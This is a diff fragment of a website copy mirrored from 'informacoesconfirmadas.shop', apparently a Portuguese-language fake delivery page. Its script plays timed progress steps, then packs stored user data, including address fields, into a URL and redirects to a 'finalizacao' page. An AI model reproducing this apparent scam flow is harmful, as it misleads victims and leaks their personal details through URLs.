+                        if (currentStep < steps.length) {
+                            setTimeout(processStep, 200);
+                        } else {
+                            setTimeout(() => {
+                                successBox.classList.add('active');
+                                
+                                // Montar queryParams com todos os dados
+                                const finalData = JSON.parse(localStorage.getItem('userData') || '{}');
+                                const queryParams = new URLSearchParams();
+                                Object.keys(finalData).forEach(key => {
+                                    if (finalData[key] !== null && finalData[key] !== undefined && typeof finalData[key] !== 'object') {
+                                        queryParams.set(key, finalData[key]);
+                                    } else if (typeof finalData[key] === 'object' && finalData[key] !== null) {
+                                        // Para objetos como endereço, achatar
+                                        Object.keys(finalData[key]).forEach(subKey => {
+                                            queryParams.set(subKey, finalData[key][subKey]);
+                                        });
+                                    }
+                                });
+                                
+                                setTimeout(() => {
+                                    window.location.href = 'finalizacaod41d.html?' + queryParams.toString();
+                                }, 1500);
+                            }, 500);
+                        }
+                    }, 800);
+                }
+            }
+
+            setTimeout(processStep, 300);
+        }
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"e116d703b7fe40798f27b675a7bf64cb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from informacoesconfirmadas.shop/entrega.html? by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 21:25:13 GMT -->
+</html>
